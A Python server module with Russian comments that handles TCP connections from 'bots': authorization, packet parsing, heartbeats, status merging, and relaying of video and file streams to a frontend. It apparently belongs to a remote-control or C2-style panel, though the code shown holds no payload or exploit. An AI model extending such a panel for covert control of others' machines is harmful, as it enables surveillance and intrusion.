# backend/Core/ClientConnection.py

import asyncio
import socket
import json

from logs import Log as logger
from backend.Services.Auth import authorize_client, sync_bot_data, BOTS_FILE
from backend.Services.ClientManager import client as active_clients
from backend.Services.ClientManager import close_client
from backend.BenchUtils import add_bytes
from backend.API import manager
from backend.API.protocols import pack_bot_command

class BotConnectionHandler:
    """Обработка жизненного цикла и протокола обмена с ботами"""

    async def handle_new_connection(self, reader, writer):
        """Входная точка для каждого нового TCP соединения"""
        client_id = None
        ip_addr = writer.get_extra_info("peername")[0]
        self._set_tcp_nodelay(writer)

        try:
            # 1. Авторизация и первичная склейка
            auth = await authorize_client(reader, ip_addr)
            if not auth:
                return await self._force_close(writer)

            client_id, bot_data = auth
            await self._register_bot(client_id, bot_data, writer, reader)

            # 2. Цикл приема пакетов
            while True:
                packet = await self._read_packet(reader)
                if not packet:
                    break
                await self._process_packet(client_id, writer, packet)

        except Exception as e:
            logger.error(f"Handler Error [{client_id}]: {e}")
        finally:
            await self._disconnect_bot(client_id, writer)

    async def _register_bot(self, cid, data, writer, reader):
        """Регистрация бота в системе и уведомление фронтенда"""
        if cid in active_clients:
            await close_client(cid, send_sleep=False)
        
        active_clients[cid] = (reader, writer)
        data['status'] = 'online'
        
        pkt = pack_bot_command(cid, "DataScribe", json.dumps([data]))
        manager.broadcast_packet_sync(pkt)
        logger.info(f"[+] Бот {cid} подключен")

    async def _process_packet(self, cid, writer, packet):
        """Разбор пакета: разделение DataScribe и бинарных потоков"""
        try:
            id_len, mod_len = packet[0], packet[1]
            module = packet[6 + id_len : 6 + id_len + mod_len].decode('utf-8', errors='ignore')

            if module == "DataScribe":
                return await self._handle_datascribe(cid, packet)
            
            if module == "Heartbeat":
                return await self._handle_heartbeat(cid, writer)

            # Проброс остальных модулей (видео, файлы) без изменений
            add_bytes(len(packet))
            manager.broadcast_packet_sync(packet)
        except Exception as e:
            logger.error(f"Packet Error [{cid}]: {e}")

    async def _handle_datascribe(self, cid, packet):
        """Вскрытие JSON, мерж с БД и отправка склеенного статуса"""
        id_len, mod_len = packet[0], packet[1]
        payload = packet[6 + id_len + mod_len:]
        try:
            data = json.loads(payload.decode('utf-8'))
            if isinstance(data, dict):
                full_data = sync_bot_data(cid, data)
                full_data['status'] = 'online'
                
                clean_pkt = pack_bot_command(cid, "DataScribe", json.dumps([full_data]))
                manager.broadcast_packet_sync(clean_pkt)
                add_bytes(len(packet))
        except: pass

    async def _handle_heartbeat(self, cid, writer):
        """Автоматический ответ на пинг бота"""
        pong = pack_bot_command(cid, "Heartbeat", "pong")
        writer.write(pong)
        await writer.drain()

    async def _disconnect_bot(self, cid, writer):
        """Завершение сессии и отправка оффлайн-статуса из БД"""
        if cid:
            active_clients.pop(cid, None)
            bot_final_data = {"id": cid, "status": "offline"}
            
            if BOTS_FILE.exists():
                try:
                    db = json.loads(BOTS_FILE.read_text(encoding="utf-8"))
                    if cid in db:
                        bot_final_data = {**db[cid], "status": "offline"}
                except: pass

            pkt = pack_bot_command(cid, "DataScribe", json.dumps([bot_final_data]))
            manager.broadcast_packet_sync(pkt)
            logger.warning(f"[-] Бот {cid} покинул туннель")
        
        await self._force_close(writer)

    async def _read_packet(self, reader):
        """Чтение заголовка и тела согласно протоколу"""
        try:
            h = await reader.readexactly(6)
            p_len = int.from_bytes(h[2:6], "big")
            body = await reader.readexactly(h[0] + h[1] + p_len)
            return h + body
        except: return None

    def _set_tcp_nodelay(self, writer):
        """Отключение алгоритма Нагла для минимизации задержек"""
        sock = writer.get_extra_info('socket')
        if sock: sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

    async def _force_close(self, writer):
        """Безопасное закрытие сокета"""
        if not writer.is_closing():
            writer.close()
            try: await asyncio.wait_for(writer.wait_closed(), 2.0)
            except: pass